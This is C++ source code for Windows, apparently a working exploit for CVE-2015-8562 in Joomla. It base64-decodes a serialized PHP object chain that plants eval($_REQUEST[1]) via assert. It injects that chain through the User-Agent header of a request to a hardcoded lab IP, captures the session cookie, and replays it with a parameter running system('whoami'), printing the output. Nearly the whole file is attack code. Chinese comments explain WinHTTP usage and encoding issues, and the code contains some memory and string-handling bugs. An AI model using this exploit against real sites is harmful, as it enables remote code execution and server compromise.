#include <Windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <stdio.h>
#include "lib/base64.h"
#include <string>
#include <corecrt_wstring.h>
#include <tchar.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>

#pragma comment(lib, "winhttp")



void help() {
	printf("%s\n", "Usage: CVE-2015-8562.exe http://baidu.com");
}

LPCWSTR stringToLPCWSTR(std::string orig)
{
    size_t origsize = orig.length() + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t* wcstring = (wchar_t*)malloc(sizeof(wchar_t) * (orig.length() - 1));
    mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
    return wcstring;
}

void GETHTTP(){
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称

    LPCWCH URL = L"/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bsystem%28%22whoami%22%29%3B%3Becho%20%27%7C%3C-%27%3B";
    const std::string PAYLOAD = "fV9fdGVzdHxPOjIxOiJKRGF0YWJhc2VEcml2ZXJNeXNxbGkiOjM6e3M6MjoiZmMiO086MTc6IkpTaW1wbGVwaWVGYWN0b3J5IjowOnt9czoyMToiXDBcMFwwZGlzY29ubmVjdEhhbmRsZXJzIjthOjE6e2k6MDthOjI6e2k6MDtPOjk6IlNpbXBsZVBpZSI6NTp7czo4OiJzYW5pdGl6ZSI7TzoyMDoiSkRhdGFiYXNlRHJpdmVyTXlzcWwiOjA6e31zOjg6ImZlZWRfdXJsIjtzOjQ2OiJldmFsKCRfUkVRVUVTVFsxXSk7SkZhY3Rvcnk6OmdldENvbmZpZygpO2V4aXQ7IjtzOjE5OiJjYWNoZV9uYW1lX2Z1bmN0aW9uIjtzOjY6ImFzc2VydCI7czo1OiJjYWNoZSI7YjoxO3M6MTE6ImNhY2hlX2NsYXNzIjtPOjIwOiJKRGF0YWJhc2VEcml2ZXJNeXNxbCI6MDp7fX1pOjE7czo0OiJpbml0Ijt9fXM6MTM6IlwwXDBcMGNvbm5lY3Rpb24iO2I6MTt9Li4uLg==";
    
    
    LPCWSTR header = stringToLPCWSTR(base64_decode(PAYLOAD, PAYLOAD.length()));
	unsigned int port = 8080;

    hSession = WinHttpOpen(header, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
    hConnect = WinHttpConnect(hSession, L"192.168.170.128", port, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", URL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);


    WinHttpAddRequestHeaders(hRequest, L"cookie: asdfasdf", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"If-Modified-Since756764: asdfasdf", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL bResults1;
    bResults1 = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, NULL, NULL);
    


    if (bResults1)
        bResults1 = WinHttpReceiveResponse(hRequest, NULL);


    DWORD dwSize = 0;
    LPVOID lpOutBuffer = NULL;
    WCHAR *cookie = NULL;
    
    if (bResults1)
    {
        
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF,
            WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);

        // Allocate memory for the buffer.
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
        {
            //lpOutBuffer = new WCHAR[dwSize / sizeof(WCHAR)];
            cookie = new WCHAR[dwSize / sizeof(WCHAR)];
            // Now, use WinHttpQueryHeaders to retrieve the header.
            bResults1 = WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_SET_COOKIE,
                WINHTTP_HEADER_NAME_BY_INDEX,
                cookie, &dwSize,
                WINHTTP_NO_HEADER_INDEX);
        }
    }


    TCHAR buf[1024] = { 0 };
    _tcscat_s(buf, 1024, L"cookie: ");
    _tcscat_s(buf, 1024, cookie);
    LPCWSTR CommandLine = buf;

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    BOOL bResults;
    LPCWCH HEADER1 = L"python-requests/2.23.0";
    LPCWSTR headercookie = buf;
    
    hSession = WinHttpOpen(HEADER1, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
    hConnect = WinHttpConnect(hSession, L"192.168.170.128", port, 0);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", URL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpAddRequestHeaders(hRequest,headercookie, -1L, WINHTTP_ADDREQ_FLAG_ADD);
    bResults = WinHttpSendRequest(hRequest, NULL, 0, WINHTTP_NO_REQUEST_DATA, 0, NULL, NULL);

    if (!bResults) {
        printf("%s", "Error:SendRequest failed: " + GetLastError());
        exit(-1);
    }
    else {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }


    //h1Request = WinHttpOpenRequest(hConnect, L"GET", URL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    //if (h1Request == NULL) {
    //    printf("%s", "Error:Open hRequest failed: " + GetLastError());
    //}

    //BOOL bResults;
    //bResults = WinHttpSendRequest(h1Request, NULL, 0, WINHTTP_NO_REQUEST_DATA, 0, NULL, NULL);



    //LPVOID lpHeaderBuffer = NULL;
    //DWORD dwSize = 0;
    //if (bResults)
    //{
    //    //(1) 获取header的长度

    //    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_COOKIE,WINHTTP_HEADER_NAME_BY_INDEX, NULL,&dwSize, WINHTTP_NO_HEADER_INDEX);

    //    //(2) 根据header的长度为buffer申请内存空间
    //    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    //    {
    //        lpHeaderBuffer = new WCHAR[dwSize / sizeof(WCHAR)];
    //        printf("test\n");
    //        //(3) 使用WinHttpQueryHeaders获取header信息
    //        bResults = WinHttpQueryHeaders(hRequest,
    //            WINHTTP_QUERY_COOKIE,
    //            WINHTTP_HEADER_NAME_BY_INDEX,
    //            lpHeaderBuffer, &dwSize,
    //            WINHTTP_NO_HEADER_INDEX);
    //    }
    //}

    //
    //printf("Header contents: \n%S", lpHeaderBuffer);


    //解析上述header信息会发现服务器返回数据的charset为uft-8。这意味着后面需要对获取到的raw data进行宽字符转换。一开始由于没有意识到需要进行转换所以得到的数据都是乱码。
    //出现乱码的原因是：HTTP在传输过程中是二值的，它并没有text或者是unicode的概念。HTTP使用7bit的ASCII码作为HTTP headers，但是内容是任意的二值数据，需要根据header中指定的编码方式来描述它（通常是Content-Type header）.
    //因此当你接收到原始的HTTP数据时，先将其保存到char[] buffer中，然后利用WinHttpQueryHearders()获取HTTP头，得到内容的Content-Type,这样你就知道数据到底是啥类型的了，是ASCII还是Unicode或者其他。
    //一旦你知道了具体的编码方式，你就可以通过MultiByteToWideChar()将其转换成合适编码的字符，存入wchar_t[]中。
    //关于乱码的解决方案请看4-4

    //4-3. 获取服务器返回数据

    LPSTR pszOutBuffer = NULL;
    DWORD dwDownloaded = 0;         //实际收取的字符数
    wchar_t* pwText = NULL;
    if (bResults)
    {
        do
        {
            //(1) 获取返回数据的大小（以字节为单位）
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
                break;
            }
            if (!dwSize)    break;  //数据大小为0                

            //(2) 根据返回数据的长度为buffer申请内存空间
            pszOutBuffer = new char[dwSize];
            if (!pszOutBuffer) {
                printf("%s", "Out of memory.");
                break;
            }
            ZeroMemory(pszOutBuffer, dwSize);       //将buffer置0

            //(3) 通过WinHttpReadData读取服务器的返回数据
            if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
                printf("%s", "Error：WinHttpQueryDataAvailable failed：" + GetLastError());
            }
            if (!dwDownloaded)
                break;

        } while (dwSize > 0);

        //4-4. 将返回数据转换成UTF8
        DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);    //返回原始ASCII码的字符数目       
        pwText = new wchar_t[dwNum];                                                //根据ASCII码的字符数分配UTF8的空间
        MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);           //将ASCII码转换成UTF8
        printf("Received contents: \n%S", pwText);
    }


    //5. 依次关闭request，connect，session句柄
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return;
}

int main(int argc, char *argv[]) {
	//if (argc != 2) {
	//	printf("%d\n", argc);
	//	help();		
	//	exit(-1);
	//}

	GETHTTP();

	//printf("%s\n", argv[1]);
	return 0;
}